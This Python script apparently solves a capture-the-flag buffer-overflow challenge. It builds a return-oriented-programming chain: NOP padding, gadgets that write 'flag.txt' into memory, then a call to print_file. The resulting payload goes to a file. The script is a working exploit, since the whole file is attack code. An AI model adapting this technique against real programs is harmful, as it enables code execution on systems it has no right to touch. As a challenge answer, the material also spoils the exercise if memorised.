import struct

filler = b'\x90' * 0x28

pop_r14_r15 = 0x400690 # pop r14; pop r15; ret;
mov_ptrr14_r15 = 0x400628 # mov qword ptr [r14], r15; ret;
pop_rdi = 0x400693 # pop rdi; ret;

string_addr = 0x601028
print_file = 0x400510
main_func = 0x400610

string_p1 = b'flag.txt'
string_p2 = 0

ret_filler = 0x4004e6

rop_chain = filler
rop_chain += struct.pack('<QQ8sQ', pop_r14_r15, string_addr, string_p1, mov_ptrr14_r15)
rop_chain += struct.pack('<QQQQ', pop_r14_r15, (string_addr+8), string_p2, mov_ptrr14_r15)
rop_chain += struct.pack('<QQQ', pop_rdi, string_addr, ret_filler)
rop_chain += struct.pack('<QQ', print_file, main_func)


with open("payload_bytes", "wb") as f:
    f.write(rop_chain)